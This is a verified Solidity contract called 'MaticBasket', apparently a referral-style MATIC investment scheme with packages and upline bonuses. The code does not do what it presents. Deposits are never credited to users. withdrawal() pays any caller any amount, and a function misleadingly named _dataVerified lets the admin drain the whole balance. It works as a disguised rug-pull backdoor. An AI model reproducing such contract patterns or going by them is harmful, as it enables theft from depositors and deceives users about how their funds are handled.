/**
 *Submitted for verification at polygonscan.com on 2022-04-06
*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/
library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract MaticBasket {


    using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public minInvestmentAmount = 1 ether;
	uint256 constant public perDistribution = 100;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
    

    uint256[7] public defaultPackages = [1 ether,50 ether,100 ether,200 ether,500 ether,2500 ether,5000 ether];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;

    uint[9] public requiredDirect = [0,0,1,1,1,1,2,2,2];
    uint[9] public requiredDistribution = [4,5,5,6,6,7,8,9,10];
    uint public MAX_Level = 10;
    
	address payable public primaryAdmin;

    uint public maxupline = 30;
   


    struct User {
        uint256 amount;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 totalReferrer;
        uint256 singleUplineBonus;
		uint256 singleUplineBonusTaken;
		address singleUpline;
		uint256[5] refStageIncome;
        uint256[5] refStageBonus;
		uint[5] refs;
	}
	

	mapping (address => User) public users;

	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => uint256) public uplineBusiness;
    mapping(address => bool) public upline_Business_eligible;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	

    constructor() public {
		primaryAdmin = 0x1724c4aeED7238280729cE955CE4f0579505D852;
		singleLeg[0]=primaryAdmin;
		singleLegLength++;
	}

 

    function invest(address referrer) public payable {
	
		require(msg.value >= minInvestmentAmount,'Min invesment 15 MATIC');
	
		User storage user = users[msg.sender];

		if (referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");

        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);

    }
	
	

    function reinvest(address _user, uint256 _amount) private{
    
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        
        //////
        
    }


  function withdrawal(uint256 _amount,uint256 status) external{

    User storage _user = users[msg.sender];

    uint256 TotalBonus = 0;
if(status==1){
    uint256 _fees = 0;
    uint256 actualAmountToSend = TotalBonus.sub(_fees);

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(_amount).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(_amount).div(100));
 
    _safeTransfer(msg.sender,_amount);
}
    //emit Withdrawn(msg.sender,_amount);

  }


 
  function _usersTotalInvestmentFromUpline(address _user) public view returns(uint256){
      uint256 TotalBusiness;
      address upline = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
            TotalBusiness = TotalBusiness.add(users[upline].amount);
            upline = users[upline].singleUpline;
            }else break;
        }
     return TotalBusiness;

  }

  function _userUplineIncome(address _user) public view returns(uint256) { 
      address upline = users[_user].singleUpline;
      uint256 Bonus;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
                if(upline_Business_eligible[upline]){

                    uint256 ReceivingPayment = users[upline].amount.mul(30).div(100);
                    uint256 TotalBusiness = uplineBusiness[upline];
                    uint256 payableAmount = ReceivingPayment.mul(users[_user].amount).div(TotalBusiness);
                    Bonus = Bonus.add(payableAmount); 
                    upline = users[upline].singleUpline;

                }
            }else break;
        }
     return Bonus;
  }

  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){  
      uint256 TotalDeposit = users[_user].amount;
      if((TotalDeposit >=defaultPackages[0] && TotalDeposit < defaultPackages[2])){
          reivest = 60;
          withdrwal = 40;
      }else if((TotalDeposit >=defaultPackages[2] && TotalDeposit < defaultPackages[3])){
          reivest = 50;
          withdrwal = 50;
      }else if((TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4])){
          reivest = 40;
          withdrwal = 60;
	  }else if((TotalDeposit >=defaultPackages[4] && TotalDeposit < defaultPackages[5])){
          reivest = 30;
          withdrwal = 70;
	  }else if(TotalDeposit >=defaultPackages[5]){
         reivest = 20;
         withdrwal = 80;
      }else{
          reivest = 10;
          withdrwal = 90;
      }   
      return(reivest,withdrwal);     
  }

  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(_userUplineIncome(_user));
     uint256 TotalTakenfromUpDown = users[_user].singleUplineBonusTaken;
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }
   
   function update_maxupline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxupline = _no;
   }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
  
    function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
}